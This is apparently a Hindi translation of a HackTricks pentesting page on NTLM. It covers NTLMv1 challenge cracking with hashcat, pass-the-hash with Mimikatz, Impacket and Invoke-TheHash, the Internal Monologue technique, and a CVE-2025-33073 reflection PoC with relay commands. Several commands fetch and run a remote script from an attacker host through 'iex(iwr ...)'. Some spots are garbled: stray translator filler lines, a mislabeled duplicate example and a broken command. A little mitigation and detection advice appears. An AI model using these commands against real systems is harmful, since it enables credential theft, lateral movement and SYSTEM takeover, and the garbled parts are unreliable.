# NTLM

{{#include ../../banners/hacktricks-training.md}}


## मूलभूत जानकारी

जिन environments में **Windows XP और Server 2003** चल रहे हैं, वहाँ LM (Lan Manager) hashes का उपयोग किया जाता है, हालांकि यह व्यापक रूप से ज्ञात है कि इन्हें आसानी से compromise किया जा सकता है। एक विशेष LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, उस स्थिति को दर्शाता है जहाँ LM का उपयोग नहीं किया जाता, और यह एक empty string का hash है।

डिफ़ॉल्ट रूप से, **Kerberos** authentication protocol मुख्य रूप से उपयोग किया जाता है। NTLM (NT LAN Manager) कुछ विशेष परिस्थितियों में सक्रिय होता है: Active Directory की अनुपस्थिति, domain का मौजूद न होना, गलत configuration के कारण Kerberos का काम न करना, या valid hostname के बजाय IP address का उपयोग करके connection का प्रयास किया जाना।

Network packets में **"NTLMSSP"** header की मौजूदगी NTLM authentication process का संकेत देती है।

Authentication protocols - LM, NTLMv1 और NTLMv2 - के लिए support `%windir%\Windows\System32\msv1\_0.dll` पर स्थित एक specific DLL द्वारा प्रदान किया जाता है।

**मुख्य बिंदु**:

- LM hashes vulnerable होते हैं और एक empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) इसके उपयोग न किए जाने का संकेत देता है।
- Kerberos default authentication method है, जबकि NTLM का उपयोग केवल कुछ विशेष परिस्थितियों में किया जाता है।
- NTLM authentication packets की पहचान "NTLMSSP" header से की जा सकती है।
- LM, NTLMv1 और NTLMv2 protocols को system file `msv1\_0.dll` द्वारा support किया जाता है।

## LM, NTLMv1 और NTLMv2

आप check और configure कर सकते हैं कि कौन-सा protocol उपयोग किया जाएगा:

### GUI

_secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level चलाएँ। इसमें 6 levels होते हैं (0 से 5 तक)।

![LM, NTLMv1 और NTLMv2 - GUI: secpol.msc चलाएँ - Local policies - Security Options - Network Security: LAN Manager authentication level। इसमें 6 levels होते हैं (0 से 5 तक)](<../../images/image (919).png>)

### Registry

यह level 5 सेट करेगा:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
संभावित मान:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user** अपने **credentials** दर्ज करता है
2. Client machine **domain name** और **username** भेजते हुए **authentication request** भेजती है
3. **server** **challenge** भेजता है
4. **client** password के hash को key के रूप में उपयोग करके **challenge** को **encrypt** करता है और उसे response के रूप में भेजता है
5. **server**, **domain name, username, challenge और response** को **Domain controller** को भेजता है। यदि कोई **Active Directory** configured **नहीं है** या domain name server का नाम है, तो credentials **locally check** किए जाते हैं।
6. **domain controller checks if everything is correct** और information को server को भेजता है

**server** और **Domain Controller**, **Netlogon** server के माध्यम से एक **Secure Channel** बना सकते हैं, क्योंकि Domain Controller को server का password पता होता है (यह **NTDS.DIT** db के अंदर होता है)।

### Local NTLM authentication Scheme

Authentication ऊपर बताए गए तरीके जैसी ही होती है, **लेकिन** **server** के पास **SAM** file में authenticate करने का प्रयास कर रहे **user** का **hash** मौजूद होता है। इसलिए, **Domain Controller** से पूछने के बजाय, **server स्वयं check करेगा** कि user authenticate कर सकता है या नहीं।

### NTLMv1 Challenge

**challenge की length 8 bytes** होती है और **response 24 bytes** लंबा होता है।

**NT hash (16bytes)** को **7bytes के 3 parts** में विभाजित किया जाता है (7B + 7B + (2B+0x00\*5)): **last part को zeros से भरा जाता है**। फिर, **challenge** को प्रत्येक part के साथ अलग-अलग **cipher** किया जाता है और **resulting** ciphered bytes को **join** किया जाता है। Total: 8B + 8B + 8B = 24Bytes।

**Problems**:

- **randomness** की कमी
- 3 parts पर अलग-अलग **attack** करके NT hash खोजा जा सकता है
- **DES crackable है**
- 3º key हमेशा **5 zeros** से बनी होती है।
- समान **challenge** दिए जाने पर **response** भी **same** होगा। इसलिए, victim को **challenge** के रूप में "**1122334455667788**" string दी जा सकती है और **precomputed rainbow tables** का उपयोग करके response पर attack किया जा सकता है।

### NTLMv1 attack

Unconstrained delegation modern environments में कम common है, लेकिन एक reachable **Print Spooler service** का अब भी abuse करके authentication को ऐसे host पर coerce किया जा सकता है।

आपके पास AD पर पहले से मौजूद कुछ credentials/sessions का abuse करके **printer को आपके control वाले किसी host के विरुद्ध authenticate करने के लिए कह** सकते हैं। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का उपयोग करके आप **authentication challenge को 1122334455667788 पर set** कर सकते हैं, authentication attempt को capture कर सकते हैं, और यदि यह **NTLMv1** का उपयोग करके किया गया था, तो आप इसे **crack** कर पाएंगे।\
यदि आप `responder` का उपयोग कर रहे हैं, तो **authentication को downgrade** करने का प्रयास करने के लिए **flag `--lm` का उपयोग** कर सकते हैं।\
_ध्यान दें कि इस technique के लिए authentication को NTLMv1 का उपयोग करके perform किया जाना चाहिए (NTLMv2 valid नहीं है)।_

याद रखें कि authentication के दौरान printer computer account का उपयोग करेगा, और computer accounts में **long and random passwords** होते हैं, जिन्हें आप common **dictionaries** का उपयोग करके **probably crack नहीं कर पाएंगे**। लेकिन **NTLMv1** authentication **DES** का उपयोग करती है ([more info here](#ntlmv1-challenge)), इसलिए DES cracking के लिए specially dedicated कुछ services का उपयोग करके आप इसे crack कर पाएंगे (उदाहरण के लिए [https://crack.sh/](https://crack.sh) या [https://ntlmv1.com/](https://ntlmv1.com) का उपयोग कर सकते हैं)।

### NTLMv1 attack with hashcat

NTLMv1 पर [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) का उपयोग करके भी attack किया जा सकता है, जो captured NTLMv1 messages को Hashcat के लिए suitable formats में convert करता है।<sup>[[1]](#references)</sup>

कमांड
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
नीचे दिया गया आउटपुट होगा:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
कृपया फ़ाइल की सामग्री भेजें।
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcat चलाएँ (distributed करना hashtopolis जैसे tool के माध्यम से सबसे बेहतर है), क्योंकि अन्यथा इसमें कई दिन लगेंगे।
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
इस मामले में हमें इसका password पता है, जो password है, इसलिए demo purposes के लिए हम cheat करने वाले हैं:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
अब हमें cracked des keys को NTLM hash के parts में बदलने के लिए hashcat-utilities का उपयोग करना होगा:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
कृपया अनुवाद के लिए अंतिम भाग का पाठ भेजें।
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
कृपया वह सामग्री भेजें जिसे एक साथ संयोजित करना है।
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge की length 8 bytes है** और **2 responses भेजे जाते हैं**: इनमें से एक **24 bytes** लंबा होता है और **दूसरे की length variable** होती है।

**पहला response** **HMAC_MD5** का उपयोग करके ciphering द्वारा बनाया जाता है। इसमें **client और domain** से बनी **string** तथा **key** के रूप में **NT hash** का **hash MD4** उपयोग किया जाता है। फिर, **result** को **key** के रूप में उपयोग करके **HMAC_MD5** द्वारा **challenge** को cipher किया जाता है। इसमें **8 bytes का client challenge** जोड़ा जाएगा। कुल: 24 B।

**दूसरा response** **कई values** का उपयोग करके बनाया जाता है (एक नया client challenge, **replay attacks** से बचने के लिए एक **timestamp**...)

यदि आपके पास **successful authentication exchange वाला PCAP** है, तो domain, username, server challenge और NTLMv2 response extract करें, capture को Hashcat के लिए format करें और password recovery का प्रयास करने के लिए mode `5600` उपयोग करें। Archived practical walkthrough packet-field extraction procedure को बनाए रखता है, जबकि Hashcat के examples वर्तमान accepted format को define करते हैं।<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**एक बार आपके पास victim का hash आ जाए**, तो आप इसका उपयोग उसे **impersonate** करने के लिए कर सकते हैं।\
आपको एक **tool** का उपयोग करना होगा जो उस **hash का उपयोग करके NTLM authentication perform** करे, **या** आप एक नया **sessionlogon** create करके उस **hash को LSASS के अंदर inject** कर सकते हैं, ताकि जब भी **NTLM authentication perform हो**, उस **hash का उपयोग किया जाए।** अंतिम विकल्प mimikatz करता है।

**कृपया याद रखें कि आप Computer accounts का उपयोग करके भी Pass-the-Hash attacks perform कर सकते हैं।**

### **Mimikatz**

**इसे administrator के रूप में run करना आवश्यक है**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
यह वर्तमान local user के अंतर्गत एक process लॉन्च करता है, जबकि LSASS दी गई credentials को अपने outbound network logon के साथ associate करता है। इसके बाद आप plaintext password जाने बिना, दी गई user के रूप में network resources access कर सकते हैं, ठीक `runas /netonly` की तरह।

### Linux से Pass-the-Hash

आप Linux से Pass-the-Hash का उपयोग करके Windows machines में code execution प्राप्त कर सकते हैं।\
[**Practical Pass-the-Hash execution examples देखें।**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows compiled tools

आप [Windows के लिए impacket binaries यहां download कर सकते हैं](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)।

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (इस मामले में आपको एक command specify करनी होगी; interactive shell प्राप्त करने के लिए cmd.exe और powershell.exe valid नहीं हैं) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Impacket की कई अन्य binaries भी हैं...

### Invoke-TheHash

आप यहां से powershell scripts प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

यह function पिछले modes को संयोजित करता है। आप **कई hosts** पास कर सकते हैं, चुने गए targets को exclude कर सकते हैं, और _SMBExec, WMIExec, SMBClient,_ या _SMBEnum_ चुन सकते हैं। यदि आप _**Command**_ parameter के बिना **SMBExec** या **WMIExec** चुनते हैं, तो यह केवल जांचता है कि आपके पास पर्याप्त permissions हैं या नहीं।
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**इसे administrator के रूप में चलाना आवश्यक है**

यह tool mimikatz जैसा ही काम करेगा (LSASS memory को modify करना)।
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### username और password के साथ Manual Windows remote execution


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host से credentials निकालना

अधिक जानकारी के लिए [**Stealing Windows Credentials**](../stealing-credentials/README.md) देखें।

## Internal Monologue attack

Internal Monologue Attack एक stealthy credential extraction technique है, जो attacker को **LSASS process के साथ सीधे interact किए बिना** victim की machine से NTLM hashes प्राप्त करने देती है। Mimikatz के विपरीत, जो hashes को सीधे memory से पढ़ता है और endpoint security solutions या Credential Guard द्वारा अक्सर block कर दिया जाता है, यह attack **Security Support Provider Interface (SSPI) के माध्यम से NTLM authentication package (MSV1_0) को local calls** का उपयोग करता है। Attacker पहले **NTLM settings को downgrade** करता है (जैसे LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), ताकि NetNTLMv1 की अनुमति मिल सके। इसके बाद वह running processes से प्राप्त मौजूदा user tokens का impersonation करता है और एक ज्ञात challenge का उपयोग करके NetNTLMv1 responses generate करने के लिए locally NTLM authentication trigger करता है।<sup>[[4]](#references)</sup>

इन NetNTLMv1 responses को capture करने के बाद, attacker **precomputed rainbow tables** का उपयोग करके original NTLM hashes को जल्दी recover कर सकता है, जिससे lateral movement के लिए आगे Pass-the-Hash attacks संभव हो जाते हैं। महत्वपूर्ण रूप से, Internal Monologue Attack stealthy रहता है क्योंकि यह network traffic generate नहीं करता, code inject नहीं करता और direct memory dumps trigger नहीं करता। इसलिए Mimikatz जैसी traditional methods की तुलना में defenders के लिए इसका detection कठिन होता है।

यदि enforced security policies के कारण NetNTLMv1 स्वीकार नहीं किया जाता है, तो attacker NetNTLMv1 response प्राप्त करने में विफल हो सकता है।

इस स्थिति को संभालने के लिए Internal Monologue tool को update किया गया: NetNTLMv1 के विफल होने पर भी **NetNTLMv2 responses capture** करने के लिए यह `AcceptSecurityContext()` का उपयोग करके dynamically एक server token प्राप्त करता है। हालांकि NetNTLMv2 को crack करना बहुत कठिन है, फिर भी यह कुछ सीमित परिस्थितियों में relay attacks या offline brute-force का रास्ता खोलता है।

PoC **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** पर पाया जा सकता है।<sup>[[4]](#references)</sup>

## NTLM Relay और Responder

**इन attacks को perform करने के तरीके की अधिक detailed guide यहां पढ़ें:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Network capture से NTLM challenges parse करना

**आप** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **का उपयोग कर सकते हैं।**

## Serialized SPNs के माध्यम से NTLM और Kerberos *Reflection* (CVE-2025-33073)

Windows में कई mitigations मौजूद हैं, जो उन *reflection* attacks को रोकने का प्रयास करती हैं, जिनमें किसी host से शुरू होने वाले NTLM (या Kerberos) authentication को SYSTEM privileges प्राप्त करने के लिए वापस **उसी** host पर relay किया जाता है।

Microsoft ने MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) और बाद के patches के साथ अधिकांश public chains को रोक दिया। हालांकि, **CVE-2025-33073** दिखाता है कि *marshalled* (serialized) target-info वाले **SMB client द्वारा Service Principal Names (SPNs) को truncate करने** के तरीके का दुरुपयोग करके इन protections को अब भी bypass किया जा सकता है।<sup>[[5]](#references)[[6]](#references)</sup>

### Bug का TL;DR
1. Attacker एक **DNS A-record** register करता है, जिसका label एक marshalled SPN encode करता है – जैसे:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Victim को उस hostname पर authenticate करने के लिए coerce किया जाता है (PetitPotam, DFSCoerce आदि)।
3. जब SMB client target string `cifs/srv11UWhRCAAAAA…` को `lsasrv!LsapCheckMarshalledTargetInfo` में pass करता है, तो `CredUnmarshalTargetInfo` का call serialized blob को **strip** कर देता है और **`cifs/srv1`** छोड़ता है।
4. `msv1_0!SspIsTargetLocalhost` (या Kerberos equivalent) अब target को *localhost* मानता है, क्योंकि short host part computer name (`SRV1`) से match करता है।
5. परिणामस्वरूप, server `NTLMSSP_NEGOTIATE_LOCAL_CALL` set करता है और context में **LSASS का SYSTEM access-token** inject करता है (Kerberos के लिए SYSTEM-marked subsession key बनाई जाती है)।
6. उस authentication को `ntlmrelayx.py` **या** `krbrelayx.py के साथ relay करने पर उसी host पर full SYSTEM rights मिल जाते हैं।<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch और Mitigations
* **CVE-2025-33073** के लिए KB patch `mrxsmb.sys::SmbCeCreateSrvCall` में एक check जोड़ता है, जो ऐसे किसी भी SMB connection को block करता है जिसके target में marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`) हो।<sup>[[5]](#references)[[6]](#references)</sup>
* Unpatched hosts पर भी reflection को रोकने के लिए **SMB signing** लागू करें।
* `*<base64>...*` जैसे DNS records को monitor करें और coercion vectors (PetitPotam, DFSCoerce, AuthIP...) को block करें।

### Detection ideas
* ऐसे network captures जिनमें `NTLMSSP_NEGOTIATE_LOCAL_CALL` हो और client IP ≠ server IP हो।
* ऐसा Kerberos AP-REQ जिसमें subsession key और hostname के समान client principal हो।
* Windows Event 4624/4648 SYSTEM logons के तुरंत बाद उसी host से remote SMB writes।<sup>[[5]](#references)</sup>

**March 2026** के local reflection variant के लिए, जो `SMB arbitrary ports` और `TCP connection reuse` का दुरुपयोग करके `NT AUTHORITY\SYSTEM` तक पहुंचता है, देखें:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat example hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS को छुए बिना NTLM Hashes प्राप्त करना](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Cracking an NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
